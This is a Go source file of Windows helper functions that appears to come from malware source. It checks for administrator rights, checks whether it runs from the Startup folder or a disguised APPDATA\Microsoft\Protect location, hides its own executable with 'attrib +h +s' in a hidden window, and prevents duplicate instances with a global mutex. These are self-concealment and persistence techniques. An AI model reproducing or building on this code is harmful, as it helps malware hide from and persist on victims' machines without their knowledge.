package program

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"golang.org/x/sys/windows"
)

// IsElevated checks if the program is running with administrator privileges.
func IsElevated() bool {
	ret, _, _ := syscall.NewLazyDLL("shell32.dll").NewProc("IsUserAnAdmin").Call()
	return ret != 0
}

// IsInStartupPath checks if the program is in one of the predefined startup paths.
func IsInStartupPath() bool {
	exePath, err := os.Executable()
	if err != nil {
		return false
	}
	exePath = filepath.Clean(strings.ToLower(filepath.Dir(exePath)))

	startupPaths := []string{
		strings.ToLower("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"),
		strings.ToLower(filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Protect")),
	}

	for _, path := range startupPaths {
		if exePath == path {
			return true
		}
	}

	return false
}

// HideSelf hides the executable file by marking it as hidden and system-protected.
func HideSelf() error {
	exe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to retrieve executable path: %w", err)
	}

	cmd := exec.Command("attrib", "+h", "+s", exe)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to hide the executable: %w", err)
	}

	return nil
}

// IsAlreadyRunning checks if the program is already running using a named mutex.
func IsAlreadyRunning() bool {
	const AppID = "3575651c-bb47-448e-a514-22865732bbc"

	mutexName := fmt.Sprintf("Global\\%s", AppID)
	_, err := windows.CreateMutex(nil, false, syscall.StringToUTF16Ptr(mutexName))

	if err != nil {
		if err == windows.ERROR_ALREADY_EXISTS {
			return true
		}
		// Log or handle unexpected mutex creation errors if needed.
	}

	return false
}
